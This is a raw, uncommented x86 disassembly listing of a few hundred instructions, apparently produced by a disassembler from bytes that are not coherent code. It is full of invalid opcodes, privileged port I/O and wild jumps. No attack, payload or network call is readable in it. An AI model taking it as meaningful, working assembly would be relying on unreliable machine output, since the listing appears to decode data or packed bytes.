  407faa:	b8 ce 72 0f 07       	mov    $0x70f72ce,%eax
  407faf:	88 1f                	mov    %bl,(%edi)
  407fb1:	c4 3b                	les    (%ebx),%edi
  407fb3:	9e                   	sahf
  407fb4:	7c bf                	jl     0x407f75
  407fb6:	9b                   	fwait
  407fb7:	f4                   	hlt
  407fb8:	ba a0 9f a9 ea       	mov    $0xeaa99fa0,%edx
  407fbd:	b7 21                	mov    $0x21,%bh
  407fbf:	d4 67                	aam    $0x67
  407fc1:	44                   	inc    %esp
  407fc2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407fc3:	ab                   	stos   %eax,%es:(%edi)
  407fc4:	c7                   	(bad)
  407fc5:	d3 bd 1b 1c bd bb    	sarl   %cl,-0x4442e3e5(%ebp)
  407fcb:	81 de 33 f8 fb ed    	sbb    $0xedfbf833,%esi
  407fd1:	7f dc                	jg     0x407faf
  407fd3:	b9 e6 05 b7 48       	mov    $0x48b705e6,%ecx
  407fd8:	fe                   	(bad)
  407fd9:	3c 75                	cmp    $0x75,%al
  407fdb:	cf                   	iret
  407fdc:	44                   	inc    %esp
  407fdd:	73 64                	jae    0x408043
  407fdf:	eb 6e                	jmp    0x40804f
  407fe1:	dc 66 e0             	fsubl  -0x20(%esi)
  407fe4:	8d 8c 0f 65 5a 55 dc 	lea    -0x23aaa59b(%edi,%ecx,1),%ecx
  407feb:	9d                   	popf
  407fec:	6a 23                	push   $0x23
  407fee:	ea 6a 81 6b 96 db d5 	ljmp   $0xd5db,$0x966b816a
  407ff5:	2b 6c 7a ad          	sub    -0x53(%edx,%edi,2),%ebp
  407ff9:	a2 42 7c 9e ba       	mov    %al,0xba9e7c42
  407ffe:	f9                   	stc
  407fff:	4e                   	dec    %esi
  408000:	68 37 88 31 a0       	push   $0xa0318837
  408005:	32 f1                	xor    %cl,%dh
  408007:	09 23                	or     %esp,(%ebx)
  408009:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40800a:	22 6d f1             	and    -0xf(%ebp),%ch
  40800d:	04 af                	add    $0xaf,%al
  40800f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408010:	ed                   	in     (%dx),%eax
  408011:	1d fa f8 10 c6       	sbb    $0xc610f8fa,%eax
  408016:	89 8a 6b 06 da 00    	mov    %ecx,0xda066b(%edx)
  40801c:	b6 06                	mov    $0x6,%dh
  40801e:	18 80 cd d0 0d 1e    	sbb    %al,0x1e0dd0cd(%eax)
  408024:	e8 80 75 e0 06       	call   0x720f5a9
  408029:	14 63                	adc    $0x63,%al
  40802b:	1b 00                	sbb    (%eax),%eax
  40802d:	b7 83                	mov    $0x83,%bh
  40802f:	b0 03                	mov    $0x3,%al
  408031:	5c                   	pop    %esp
  408032:	d0 8f 8a 50 67 34    	rorb   $1,0x3467508a(%edi)
  408038:	e1 b1                	loope  0x407feb
  40803a:	1b 7f 3a             	sbb    0x3a(%edi),%edi
  40803d:	50                   	push   %eax
  40803e:	4d                   	dec    %ebp
  40803f:	07                   	pop    %es
  408040:	88 4c 87 4a          	mov    %cl,0x4a(%edi,%eax,4)
  408044:	ac                   	lods   %ds:(%esi),%al
  408045:	e7 85                	out    %eax,$0x85
  408047:	1e                   	push   %ds
  408048:	ee                   	out    %al,(%dx)
  408049:	31 b0 ef 44 cb 03    	xor    %esi,0x3cb44ef(%eax)
  40804f:	0d a4 f5 61 3d       	or     $0x3d61f5a4,%eax
  408054:	1f                   	pop    %ds
  408055:	d6                   	salc
  408056:	c3                   	ret
  408057:	f3 d2 36             	repz shlb %cl,(%esi)
  40805a:	a2 da 0b 45 50       	mov    %al,0x50450bda
  40805f:	08 ed                	or     %ch,%ch
  408061:	a8 f3                	test   $0xf3,%al
  408063:	d2 0e                	rorb   %cl,(%esi)
  408065:	2c c5                	sub    $0xc5,%al
  408067:	47                   	inc    %edi
  408068:	1a 5a 3e             	sbb    0x3e(%edx),%bl
  40806b:	00 7b c3             	add    %bh,-0x3d(%ebx)
  40806e:	24 ad                	and    $0xad,%al
  408070:	1a 3a                	sbb    (%edx),%bh
  408072:	01 12                	add    %edx,(%edx)
  408074:	6a f1                	push   $0xfffffff1
  408076:	fa                   	cli
  408077:	bd 18 5d 17 1e       	mov    $0x1e175d18,%ebp
  40807c:	f9                   	stc
  40807d:	35 07 b0 84 b7       	xor    $0xb784b007,%eax
  408082:	0a a1 75 a8 f4 a0    	or     -0x5f0b578b(%ecx),%ah
  408088:	0d 49 75 a8 f6       	or     $0xf6a87549,%eax
  40808d:	60                   	pusha
  40808e:	fc                   	cld
  40808f:	5c                   	pop    %esp
  408090:	af                   	scas   %es:(%edi),%eax
  408091:	c7                   	(bad)
  408092:	9a 65 74 3e 6f 69 e2 	lcall  $0xe269,$0x6f3e7465
  408099:	75 d7                	jne    0x408072
  40809b:	e0 19                	loopne 0x4080b6
  40809d:	7e d4                	jle    0x408073
  40809f:	d7                   	xlat   %ds:(%ebx)
  4080a0:	60                   	pusha
  4080a1:	b9 0b 6b 60 fb       	mov    $0xfb606b0b,%ecx
  4080a6:	e1 b5                	loope  0x40805d
  4080a8:	68 77 52 4e 90       	push   $0x904e5277
  4080ad:	d0 44 2d 78          	rolb   $1,0x78(%ebp,%ebp,1)
  4080b1:	b0 ac                	mov    $0xac,%al
  4080b3:	1b f4                	sbb    %esp,%esi
  4080b5:	6d                   	insl   (%dx),%es:(%edi)
  4080b6:	82 69 17 9e          	subb   $0x9e,0x17(%ecx)
  4080ba:	0f                   	xsha512 (bad)
  4080bb:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4080bc:	62 58 04             	bound  %ebx,0x4(%eax)
  4080bf:	fc                   	cld
  4080c0:	9f                   	lahf
  4080c1:	41                   	inc    %ecx
  4080c2:	42                   	inc    %edx
  4080c3:	3b dc                	cmp    %esp,%ebx
  4080c5:	81 67 f5 50 db 10 da 	andl   $0xda10db50,-0xb(%edi)
  4080cc:	42                   	inc    %edx
  4080cd:	ad                   	lods   %ds:(%esi),%eax
  4080ce:	62 bd f0 13 21 1f    	bound  %edi,0x1f2113f0(%ebp)
  4080d4:	06                   	push   %es
  4080d5:	61                   	popa
  4080d6:	2d 9e 07 96 74       	sub    $0x7496079e,%eax
  4080db:	58                   	pop    %eax
  4080dc:	80 7d c2 6a          	cmpb   $0x6a,-0x3e(%ebp)
  4080e0:	f9                   	stc
  4080e1:	9f                   	lahf
  4080e2:	1b 49 c7             	sbb    -0x39(%ecx),%ecx
  4080e5:	7e e4                	jle    0x4080cb
  4080e7:	35 fc 78 86 17       	xor    $0x178678fc,%eax
  4080ec:	cf                   	iret
  4080ed:	49                   	dec    %ecx
  4080ee:	27                   	daa
  4080ef:	76 63                	jbe    0x408154
  4080f1:	cf                   	iret
  4080f2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4080f3:	a3 36 80 3d d2       	mov    %eax,0xd23d8036
  4080f8:	47                   	inc    %edi
  4080f9:	31 e3                	xor    %esp,%ebx
  4080fb:	6d                   	insl   (%dx),%es:(%edi)
  4080fc:	80 0a ef             	orb    $0xef,(%edx)
  4080ff:	df 1d 14 53 3a 14    	fistps 0x143a5314
  408105:	e0 0f                	loopne 0x408116
  408107:	ef                   	out    %eax,(%dx)
  408108:	81 4e 3c f2 7f 06 c8 	orl    $0xc8067ff2,0x3c(%esi)
  40810f:	d9 7b d6             	fnstcw -0x2a(%ebx)
  408112:	0b f6                	or     %esi,%esi
  408114:	ce                   	into
  408115:	a3 2a af 3d fe       	mov    %eax,0xfe3daf2a
  40811a:	86 9a e2 bb b7 5f    	xchg   %bl,0x5fb7bbe2(%edx)
  408120:	09 06                	or     %eax,(%esi)
  408122:	bc 86 31 9d b1       	mov    $0xb19d3186,%esp
  408127:	10 13                	adc    %dl,(%ebx)
  408129:	c2 1a cb             	ret    $0xcb1a
  40812c:	cd 28                	int    $0x28
  40812e:	0e                   	push   %cs
  40812f:	c5 92 ae a4 98 52    	lds    0x5298a4ae(%edx),%edx
  408135:	4c                   	dec    %esp
  408136:	8a d1                	mov    %cl,%dl
  408138:	c2 62 5a             	ret    $0x5a62
  40813b:	cc                   	int3
  40813c:	b1 31                	mov    $0x31,%cl
  40813e:	eb 95                	jmp    0x4080d5
  408140:	28 5e 10             	sub    %bl,0x10(%esi)
  408143:	c5 0b                	lds    (%ebx),%ecx
  408145:	98                   	cwtl
  408146:	0d 6c 2c c4 62       	or     $0x62c42c6c,%eax
  40814b:	88 69 4b             	mov    %ch,0x4b(%ecx)
  40814e:	31 59 8f             	xor    %ebx,-0x71(%ecx)
  408151:	0d 49 37 30 5e       	or     $0x5e303749,%eax
  408156:	35 c4 cc 9b 08       	xor    $0x89bccc4,%eax
  40815b:	5c                   	pop    %esp
  40815c:	85 2d a1 c3 db 4b    	test   %ebp,0x4bdbc3a1
  408162:	31 19                	xor    %ebx,(%ecx)
  408164:	01 ac c7 1a d3 21 c5 	add    %ebp,-0x3ade2ce6(%edi,%eax,8)
  40816b:	14 01                	adc    $0x1,%al
  40816d:	26 16                	es push %ss
  40816f:	13 b8 29 84 ff 60    	adc    0x60ff8429(%eax),%edi
  408175:	21 c4                	and    %eax,%esp
  408177:	04 6e                	add    $0x6e,%al
  408179:	c5 13                	lds    (%ebx),%edx
  40817b:	e9 bc 10 d1 14       	jmp    0x1511923c
  408180:	af                   	scas   %es:(%edi),%eax
  408181:	ce                   	into
  408182:	42                   	inc    %edx
  408183:	a2 d0 4b 89 71       	mov    %al,0x71894bd0
  408188:	85 f0                	test   %esi,%eax
  40818a:	3f                   	aas
  40818b:	07                   	pop    %es
  40818c:	c4                   	(bad)
  40818d:	d0 88 c2 ca d6 c0    	rorb   $1,-0x3f29353e(%eax)
  408193:	03 18                	add    (%eax),%ebx
  408195:	28 96 18 a3 62 3c    	sub    %dl,0x3c62a318(%esi)
  40819b:	31 3d 51 16 30 46    	xor    %edi,0x46301651
  4081a1:	f1                   	int1
  4081a2:	ff b0 e5 18 37 87    	push   -0x78c8e71b(%eax)
  4081a8:	87 5a 7c             	xchg   %ebx,0x7c(%edx)
  4081ab:	02 03                	add    (%ebx),%al
  4081ad:	4c                   	dec    %esp
  4081ae:	8e c2                	mov    %edx,%es
  4081b0:	9a 4a 98 05 5b 8b 19 	lcall  $0x198b,$0x5b05984a
  4081b7:	e0 71                	loopne 0x40822a
  4081b9:	98                   	cwtl
  4081ba:	00 4b 5e             	add    %cl,0x5e(%ebx)
  4081bd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4081be:	a0 a2 cc e9 14       	mov    0x14e9cca2,%al
  4081c3:	29 cf                	sub    %ecx,%edi
  4081c5:	03 9b 65 31 03 48    	add    0x48033165(%ebx),%ebx
  4081cb:	25 2a 24 c4 00       	and    $0xc4242a,%eax
  4081d0:	c0 7f a2 a8          	sarb   $0xa8,-0x5e(%edi)
  4081d4:	ee                   	out    %al,(%dx)
  4081d5:	9f                   	lahf
  4081d6:	31 8a 28 de 4a 98    	xor    %ecx,-0x67b521d8(%edx)
  4081dc:	09 8d 94 64 b3 45    	or     %ecx,0x45b36494(%ebp)
  4081e2:	89 19                	mov    %ebx,(%ecx)
  4081e4:	8c d9                	mov    %ds,%ecx
  4081e6:	6d                   	insl   (%dx),%es:(%edi)
  4081e7:	01 16                	add    %edx,(%esi)
  4081e9:	b3 3b                	mov    $0x3b,%bl
  4081eb:	26 f0 11 b9 29 26 9e 	lock adc %edi,%es:0x5f9e2629(%ecx)
  4081f2:	5f 
  4081f3:	cc                   	int3
  4081f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4081f5:	ba ec e7 a1 d8       	mov    $0xd8a1e7ec,%edx
  4081fa:	25 58 82 16 36       	and    $0x36168258,%eax
  4081ff:	a2 50 23 5f f1       	mov    %al,0xf15f2350
  408204:	ce                   	into
  408205:	50                   	push   %eax
  408206:	0f 8a 75 88 a1 ce    	jp     0xcee20a81
  40820c:	48                   	dec    %eax
  40820d:	3f                   	aas
  40820e:	1d db 8d c7 26       	sbb    $0x26c78ddb,%eax
  408213:	30 ba 41 8b 7a 1a    	xor    %bh,0x1a7a8b41(%edx)
  408219:	5d                   	pop    %ebp
  40821a:	20 22                	and    %ah,(%edx)
  40821c:	66 10 ab 26 8b f6 03 	data16 adc %ch,0x3f68b26(%ebx)
  408223:	7b f1                	jnp    0x408216
  408225:	da d8                	fcmovu %st(0),%st
  408227:	e1 c9                	loope  0x4081f2
  408229:	bc fd a1 14 7e       	mov    $0x7e14a1fd,%esp
  40822e:	e6 50                	out    %al,$0x50
  408230:	86 19                	xchg   %bl,(%ecx)
  408232:	0c 3c                	or     $0x3c,%al
  408234:	e7 5c                	out    %eax,$0x5c
  408236:	4b                   	dec    %ebx
  408237:	5a                   	pop    %edx
  408238:	48                   	dec    %eax
  408239:	48                   	dec    %eax
  40823a:	68 48 8a 69 66       	push   $0x66698a48
  40823f:	88 02                	mov    %al,(%edx)
  408241:	0a 40 4a             	or     0x4a(%eax),%al
  408244:	88 e8                	mov    %ch,%al
  408246:	c4 09                	les    (%ecx),%ecx
  408248:	ff 91 60 b2 88 3a    	call   *0x3a88b260(%ecx)
  40824e:	98                   	cwtl
  40824f:	25 e3 bd ae a0       	and    $0xa0aebde3,%eax
  408254:	68 c6 e1 c2 43       	push   $0x43c2e1c6
  408259:	18 18                	sbb    %bl,(%eax)
  40825b:	f8                   	clc
  40825c:	78 f0                	js     0x40824e
  40825e:	e1 30                	loope  0x408290
  408260:	58                   	pop    %eax
  408261:	58                   	pop    %eax
  408262:	48                   	dec    %eax
  408263:	bc 25 86 9f 11       	mov    $0x119f8625,%esp
  408268:	8a 6d 85             	mov    -0x7b(%ebp),%ch
  40826b:	50                   	push   %eax
  40826c:	6b 68 85 86          	imul   $0xffffff86,-0x7b(%eax),%ebp
  408270:	86 f2                	xchg   %dh,%dl
  408272:	36 b0 da             	ss mov $0xda,%al
  408275:	e3 66                	jecxz  0x4082dd
  408277:	bc 0e 06 1f 1a       	mov    $0x1a1f060e,%esp
  40827c:	1b 33                	sbb    (%ebx),%esi
  40827e:	34 0f                	xor    $0xf,%al
  408280:	c3                   	ret
  408281:	3b 5d e1             	cmp    -0x1f(%ebp),%ebx
  408284:	2d fe bf f6 ae       	sub    $0xaef6bffe,%eax
  408289:	e6 b7                	out    %al,$0xb7
  40828b:	8d 22                	lea    (%edx),%esp
  40828d:	8a cf                	mov    %bh,%cl
  40828f:	5b                   	pop    %ebx
  408290:	af                   	scas   %es:(%edi),%eax
  408291:	77 67                	ja     0x4082fa
  408293:	1d 7b 6a 6f dd       	sbb    $0xdd6f6a7b,%eax
  408298:	36 0d 4e 58 4a 0a    	ss or  $0xa4a584e,%eax
  40829e:	db d2                	fcmovnbe %st(2),%st
  4082a0:	18 3b                	sbb    %bh,(%ebx)
  4082a2:	75 44                	jne    0x4082e8
  4082a4:	c4 87 0a 4a 5a 29    	les    0x295a4a0a(%edi),%eax
  4082aa:	52                   	push   %edx
  4082ab:	a8 10                	test   $0x10,%al
  4082ad:	44                   	inc    %esp
  4082ae:	a1 42 48 d5 a6       	mov    0xa6d54842,%eax
  4082b3:	d8 69 d5             	fsubrs -0x2b(%ecx)
  4082b6:	e0 56                	loopne 0x40830e
  4082b8:	6d                   	insl   (%dx),%es:(%edi)
  4082b9:	85 14 14             	test   %edx,(%esp,%edx,1)
  4082bc:	89 70 e0             	mov    %esi,-0x20(%eax)
  4082bf:	c0 2d ff 46 6f 39 44 	shrb   $0x44,0x396f46ff
  4082c6:	22 87 20 45 9c 38    	and    0x389c4520(%edi),%al
  4082cc:	72 e1                	jb     0x4082af
  4082ce:	d4 4b                	aam    $0x4b
  4082d0:	ff 03                	incl   (%ebx)
  4082d2:	fe 03                	incb   (%ebx)
  4082d4:	e0 f7                	loopne 0x4082cd
  4082d6:	de ec                	fsubrp %st,%st(4)
  4082d8:	ae                   	scas   %es:(%edi),%al
  4082d9:	3f                   	aas
  4082da:	88 04 b7             	mov    %al,(%edi,%esi,4)
  4082dd:	f6 c0 8b             	test   $0x8b,%al
  4082e0:	3c 1f                	cmp    $0x1f,%al
  4082e2:	ef                   	out    %eax,(%dx)
  4082e3:	cd 9b                	int    $0x9b
  4082e5:	79 f3                	jns    0x4082da
  4082e7:	de cc                	fmulp  %st,%st(4)
  4082e9:	ec                   	in     (%dx),%al
  4082ea:	1b 7b 36             	sbb    0x36(%ebx),%edi
  4082ed:	d3 98 3c 5d 25 c7    	rcrl   %cl,-0x38daa2c4(%eax)
  4082f3:	01 ae 4d 33 4a 48    	add    %ebp,0x484a334d(%esi)
  4082f9:	33 e8                	xor    %eax,%ebp
  4082fb:	7e 09                	jle    0x408306
  4082fd:	0c 3f                	or     $0x3f,%al
  4082ff:	c0 76 08 2d          	shlb   $0x2d,0x8(%esi)
  408303:	f7 af e8 b3 d6 3f    	imull  0x3fd6b3e8(%edi)
  408309:	7d fb                	jge    0x408306
  40830b:	e5 fa                	in     $0xfa,%eax
  40830d:	f9                   	stc
  40830e:	ce                   	into
  40830f:	f3 1f                	repz pop %ds
  408311:	f5                   	cmc
  408312:	fe                   	(bad)
  408313:	b5 db                	mov    $0xdb,%ch
  408315:	df d5                	(bad)
  408317:	7e 2f                	jle    0x408348
  408319:	bd 4b 8a 5f 2b       	mov    $0x2b5f8a4b,%ebp
  40831e:	a0 02 b9 54 24       	mov    0x2454b902,%al
  408323:	8f                   	(bad)
  408324:	20 04 05 54 a2 09 2a 	and    %al,0x2a09a254(,%eax,1)
  40832b:	53                   	push   %ebx
  40832c:	85 0c 9d a2 2a d5 28 	test   %ecx,0x28d52aa2(,%ebx,4)
  408333:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408334:	d3 54 a7 33          	rcll   %cl,0x33(%edi,%eiz,4)
  408338:	74 96                	je     0x4082d0
  40833a:	ce                   	into
  40833b:	d1 24 9d a7 29 7a 85 	shll   $1,-0x7a85d659(,%ebx,4)
  408342:	1a 34 4d 33 f4 2a 35 	sbb    0x352af433(,%ecx,2),%dh
  408349:	e9 2a bd 46 1d       	jmp    0x1d874078
  40834e:	8a e8                	mov    %al,%ch
  408350:	2d ba 42 73 d4       	sub    $0xd47342ba,%eax
  408355:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408356:	79 ba                	jns    0x408312
  408358:	40                   	inc    %eax
  408359:	af                   	scas   %es:(%edi),%eax
  40835a:	d3 2c 5d a4 37 e8 4d 	shrl   %cl,0x4de837a4(,%ebx,2)
  408361:	8a e9                	mov    %cl,%ch
  408363:	12 5d a6             	adc    -0x5a(%ebp),%bl
  408366:	b7 a9                	mov    $0xa9,%bh
  408368:	e5 f2                	in     $0xf2,%eax
  40836a:	21 52 b7             	and    %edx,-0x49(%edx)
  40836d:	98                   	cwtl
  40836e:	9d                   	popf
  40836f:	e1 74                	loope  0x4083e5
  408371:	55                   	push   %ebp
  408372:	15 01 9f cb 74       	adc    $0x74cb9f01,%eax
  408377:	f9                   	stc
  408378:	b0 a7                	mov    $0xa7,%al
  40837a:	cb                   	lret
  40837b:	48                   	dec    %eax
  40837c:	97                   	xchg   %eax,%edi
  40837d:	6f                   	outsl  %ds:(%esi),(%dx)
  40837e:	81 77 ab 1c 14 38 e0 	xorl   $0xe038141c,-0x55(%edi)
  408385:	cb                   	lret
  408386:	e4 5d                	in     $0x5d,%al
  408388:	be 35 de e5 e3       	mov    $0xe3e5de35,%esi
  40838d:	a1 ee 04 07 65       	mov    0x650704ee,%eax
  408392:	fe                   	(bad)
  408393:	e7 e8                	out    %eax,$0xe8
  408395:	5e                   	pop    %esi
  408396:	d8 70 3c             	fdivs  0x3c(%eax)
  408399:	83 a8 ec 78 c5 82 57 	subl   $0x57,-0x7d3a8714(%eax)
  4083a0:	ab                   	stos   %eax,%es:(%edi)
  4083a1:	3b 9e 76 3c a7 e0    	cmp    -0x1f58c38a(%esi),%ebx
  4083a7:	4d                   	dec    %ebp
  4083a8:	73 6e                	jae    0x408418
  4083aa:	c7                   	(bad)
  4083ab:	b7 53                	mov    $0x53,%bh
  4083ad:	c5 29                	lds    (%ecx),%ebp
  4083af:	db f8                	(bad)
  4083b1:	4c                   	dec    %esp
  4083b2:	b8 fb 3d 99 c0       	mov    $0xc0993dfb,%eax
  4083b7:	93                   	xchg   %eax,%ebx
  4083b8:	38 dc                	cmp    %bl,%ah
  4083ba:	dd cf                	(bad)
  4083bc:	53                   	push   %ebx
  4083bd:	07                   	pop    %es
  4083be:	ae                   	scas   %es:(%edi),%al
  4083bf:	57                   	push   %edi
  4083c0:	db 3d ac 48 29 5f    	fstpt  0x5f2948ac
  4083c6:	70 d3                	jo     0x40839b
  4083c8:	0d df 12 8d f6       	or     $0xf68d12df,%eax
  4083cd:	52                   	push   %edx
  4083ce:	04 97                	add    $0x97,%al
  4083d0:	39 ca                	cmp    %ecx,%edx
  4083d2:	59                   	pop    %ecx
  4083d3:	f6 d0                	not    %al
  4083d5:	68 e2 78 3e 63       	push   $0x633e78e2
  4083da:	8f                   	(bad)
  4083db:	1d 2f e0 71 df       	sbb    $0xdf71e02f,%eax
  4083e0:	90                   	nop
  4083e1:	61                   	popa
  4083e2:	d8 e0                	fsub   %st(0),%st
  4083e4:	64 59                	fs pop %ecx
  4083e6:	92                   	xchg   %eax,%edx
  4083e7:	65 24 21             	gs and $0x21,%al
  4083ea:	85 92 c9 6b d0 01    	test   %edx,0x1d06bc9(%edx)
  4083f0:	3b 73 b5             	cmp    -0x4b(%ebx),%esi
  4083f3:	45                   	inc    %ebp
  4083f4:	f0 b0 75             	lock mov $0x75,%al
  4083f7:	78 ec                	js     0x4083e5
  4083f9:	f3 e0 32             	repz loopne 0x40842e
  4083fc:	6c                   	insb   (%dx),%es:(%edi)
  4083fd:	a3 ed e9 22 4f       	mov    %eax,0x4f22e9ed
  408402:	b3 62                	mov    $0x62,%bl
  408404:	b8 8d e1 a5 27       	mov    $0x27a5e18d,%eax
  408409:	b5 c6                	mov    $0xc6,%ch
  40840b:	e0 77                	loopne 0x408484
  40840d:	26 31 f0             	es xor %esi,%eax
  408410:	9d                   	popf
  408411:	6a 89                	push   $0xffffff89
  408413:	93                   	xchg   %eax,%ebx
  408414:	5c                   	pop    %esp
  408415:	14 65                	adc    $0x65,%al
  408417:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408418:	c2 b0 cc             	ret    $0xccb0
  40841b:	71 58                	jno    0x408475
  40841d:	46                   	inc    %esi
  40841e:	c5 b2 5a ec 54 22    	lds    0x2254ec5a(%edx),%esi
  408424:	17                   	pop    %ss
  408425:	a1 d1 b6 cb 3a       	mov    0x3acbb6d1,%eax
  40842a:	cd f1                	int    $0xf1
  40842c:	ac                   	lods   %ds:(%esi),%al
  40842d:	ac                   	lods   %ds:(%esi),%al
  40842e:	d5 a5                	aad    $0xa5
  408430:	44                   	inc    %esp
  408431:	5d                   	pop    %ebp
  408432:	47                   	inc    %edi
  408433:	56                   	push   %esi
  408434:	00 27                	add    %ah,(%edi)
  408436:	40                   	inc    %eax
  408437:	d6                   	salc
  408438:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408439:	a2 a8 48 43 ba       	mov    %al,0xba4348a8
  40843e:	c9                   	leave
  40843f:	34 93                	xor    $0x93,%al
  408441:	e9 c5 98 4a ca       	jmp    0xca8b1d0b
  408446:	63 e9                	arpl   %ebp,%ecx
  408448:	26 63 b4 d9 12 13 2d 	arpl   %esi,%es:-0x38d2ecee(%ecx,%ebx,8)
  40844f:	c7 
  408450:	84 50 6c             	test   %dl,0x6c(%eax)
  408453:	7a 80                	jp     0x4083d5
  408455:	3e 18 42 1f          	sbb    %al,%ds:0x1f(%edx)
  408459:	f0 58                	lock pop %eax
  40845b:	47                   	inc    %edi
  40845c:	47                   	inc    %edi
  40845d:	7d 48                	jge    0x4084a7
  40845f:	c6                   	(bad)
  408460:	53                   	push   %ebx
  408461:	27                   	daa
  408462:	88 3c 89             	mov    %bh,(%ecx,%ecx,4)
  408465:	8d b1 4b d5 61 0d    	lea    0xd61d54b(%ecx),%esi
  40846b:	f4                   	hlt
  40846c:	61                   	popa
  40846d:	0b 18                	or     (%eax),%ebx
  40846f:	bb d8 1c 1a 2b       	mov    $0x2b1a1cd8,%ebx
  408474:	42                   	inc    %edx
  408475:	86 3e                	xchg   %bh,(%esi)
  408477:	95                   	xchg   %eax,%ebp
  408478:	ca 90 e5             	lret   $0xe590
  40847b:	3d 28 91 b5 8b       	cmp    $0x8bb59128,%eax
  408480:	9e                   	sahf
  408481:	18 03                	sbb    %al,(%ebx)
  408483:	ed                   	in     (%dx),%eax
  408484:	4c                   	dec    %esp
  408485:	48                   	dec    %eax
  408486:	35 22 ad d1 a9       	xor    $0xa9d1ad22,%eax
  40848b:	24 86                	and    $0x86,%al
  40848d:	d5 81                	aad    $0x81
  40848f:	42                   	inc    %edx
  408490:	c6                   	(bad)
  408491:	94                   	xchg   %eax,%esp
  408492:	33 2a                	xor    (%edx),%ebp
  408494:	d7                   	xlat   %ds:(%ebx)
  408495:	1f                   	pop    %ds
  408496:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408497:	e4 e9                	in     $0xe9,%al
  408499:	46                   	inc    %esi
  40849a:	29 93 13 86 47 7d    	sub    %edx,0x7d478613(%ebx)
  4084a0:	b5 1d                	mov    $0x1d,%ch
  4084a2:	4c                   	dec    %esp
  4084a3:	38 59 49             	cmp    %bl,0x49(%ecx)
  4084a6:	61                   	popa
  4084a7:	73 2d                	jae    0x4084d6
  4084a9:	62 1c 59             	bound  %ebx,(%ecx,%ebx,2)
  4084ac:	29 8f 64 c6 1a cd    	sub    %ecx,-0x32e5399c(%edi)
  4084b2:	d2 3b                	sarb   %cl,(%ebx)
  4084b4:	88 59 43             	mov    %bl,0x43(%ecx)
  4084b7:	85 ac 8b 7b 66 48 25 	test   %ebp,0x2548667b(%ebx,%ecx,4)
  4084be:	7b 43                	jnp    0x408503
  4084c0:	7d df                	jge    0x4084a1
  4084c2:	0b b2 34 ba 5f 60    	or     0x605fba34(%edx),%esi
  4084c8:	c3                   	ret
  4084c9:	c0 94 84 b9 1d 60 21 	rclb   $0xc6,0x21601db9(%esp,%eax,4)
  4084d0:	c6 
  4084d1:	0c c7                	or     $0xc7,%al
  4084d3:	52                   	push   %edx
  4084d4:	90                   	nop
  4084d5:	8e 12                	mov    (%edx),%ss
  4084d7:	ad                   	lods   %ds:(%esi),%eax
  4084d8:	15 4b ca 4b 83       	adc    $0x834bca4b,%eax
  4084dd:	4a                   	dec    %edx
  4084de:	97                   	xchg   %eax,%edi
  4084df:	47                   	inc    %edi
  4084e0:	15 26 32 9a 12       	adc    $0x129a3226,%eax
  4084e5:	cc                   	int3
  4084e6:	5c                   	pop    %esp
  4084e7:	9f                   	lahf
  4084e8:	1f                   	pop    %ds
  4084e9:	07                   	pop    %es
  4084ea:	be 08 74 6c 05       	mov    $0x56c7408,%esi
  4084ef:	3a ae 40 92 30 09    	cmp    0x9309240(%esi),%ch
  4084f5:	13 df                	adc    %edi,%ebx
  4084f7:	d7                   	xlat   %ds:(%ebx)
  4084f8:	c8 a1 4c c0          	enter  $0x4ca1,$0xc0
  4084fc:	65 02 6e 27          	add    %gs:0x27(%esi),%ch
  408500:	4c                   	dec    %esp
  408501:	02 7e 0e             	add    0xe(%esi),%bh
  408504:	f0 1a e1             	lock sbb %cl,%ah
  408507:	c6                   	(bad)
  408508:	18 9f 85 58 19 4e    	sbb    %bl,0x4e195885(%edi)
  40850e:	94                   	xchg   %eax,%esp
  40850f:	11 d4                	adc    %edx,%esp
  408511:	76 10                	jbe    0x408523
  408513:	60                   	pusha
  408514:	9a c4 58 6c 63 e5 30 	lcall  $0x30e5,$0x636c58c4
  40851b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40851c:	ae                   	scas   %es:(%edi),%al
  40851d:	e3 74                	jecxz  0x408593
  40851f:	80 54 e2 61 ab       	adcb   $0xab,0x61(%edx,%eiz,8)
  408524:	97                   	xchg   %eax,%edi
  408525:	e2 dc                	loop   0x408503
  408527:	cc                   	int3
  408528:	83 e4 41             	and    $0x41,%esp
  40852b:	31 16                	xor    %edx,(%esi)
  40852d:	e3 c4                	jecxz  0x4084f3
  40852f:	23 c6                	and    %esi,%eax
  408531:	d1 29                	shrl   $1,(%ecx)
  408533:	dd 04 71             	fldl   (%ecx,%esi,2)
  408536:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408537:	5a                   	pop    %edx
  408538:	29 77 34             	sub    %esi,0x34(%edi)
  40853b:	60                   	pusha
  40853c:	dc 63 09             	fsubl  0x9(%ebx)
  40853f:	12 b4 e9 0b e5 18 a9 	adc    -0x56e71af5(%ecx,%ebp,8),%dh
  408546:	40                   	inc    %eax
  408547:	f3 2b a2 0c 33 58 87 	repz sub -0x78a7ccf4(%edx),%esp
  40854e:	d4 9a                	aam    $0x9a
  408550:	73 f6                	jae    0x408548
  408552:	73 38                	jae    0x40858c
  408554:	67 37                	addr16 aaa
  408556:	1f                   	pop    %ds
  408557:	f4                   	hlt
  408558:	f3 6f                	rep outsl %ds:(%esi),(%dx)
  40855a:	f3 d6                	repz salc
  40855c:	ee                   	out    %al,(%dx)
  40855d:	c2 75 7c             	ret    $0x7c75
  408560:	8c 45 49             	mov    %es,0x49(%ebp)
  408563:	d9 13                	fsts   (%ebx)
  408565:	dc 86 54 30 38 31    	faddl  0x31383054(%esi)
  40856b:	07                   	pop    %es
  40856c:	25 32 f2 1c a9       	and    $0xa91cf232,%eax
  408571:	30 ff                	xor    %bh,%bh
  408573:	4d                   	dec    %ebp
  408574:	22 fa                	and    %dl,%bh
  408576:	e5 69                	in     $0x69,%eax
  408578:	14 cd                	adc    $0xcd,%al
  40857a:	b7 e6                	mov    $0xe6,%bh
